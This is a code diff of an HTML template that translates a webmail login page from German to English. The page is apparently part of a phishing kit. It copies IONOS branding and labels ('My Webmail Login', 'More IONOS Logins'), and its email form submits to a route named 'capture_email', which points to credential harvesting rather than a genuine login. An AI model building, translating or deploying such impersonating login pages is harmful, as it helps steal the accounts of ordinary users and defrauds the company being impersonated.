@@ -66,22 +66,22 @@
   <form class="form" id="form" method="POST" action="{{ url_for('capture_email') }}">
     <div class="img-tag">
       <img src="{{ url_for('static', filename="Photo/product-email.svg") }}" class="img"/>
-      <h2>Mein Webmail Login</h2>
+      <h2>My Webmail Login</h2>
     </div>
     <div class="input-email">
-      <label for="email">E-Mail-Adresse</label>
+      <label for="email">Email address</label>
       <input type="email" name="email" id="email" value="" required />
       <p class="input-title">
-        Nicht Ihr Gerät? Melden Sie sich nach der Sitzung ab oder verwenden Sie den.
-        <span><a href="" class="span">privaten Browsermodus.</a></span>
+        Not your device? Log out after the session or use
+        <span><a href="" class="span">private browsing mode.</a></span>
       </p>
       <div class="enter">
-        <button type="submit" class="btn">Weiter</button>
+        <button type="submit" class="btn">Next</button>
       </div>
     </div>
     <div class="form-fotter">
-      <h2>Noch kein IONOS Kunde?</h2>
-      <a href="">Jetzt Kunde werden und von unseren Angeboten profitieren.</a>
+      <h2>Not an IONOS customer yet?</h2>
+      <a href="">Become a customer now and benefit from our offers.</a>
     </div>
   </form>
 </div>
@@ -89,7 +89,7 @@
 
 
       <section class="section-tag">
-        <h2 class="title-tag">Weitere IONOS Logins</h2>
+        <h2 class="title-tag">More IONOS Logins</h2>
         <div class="sectionbox">
           <div class="box-tag">
             <img src="{{ url_for('static', filename="Photo/my-account.svg")}}" class="section-img"/>
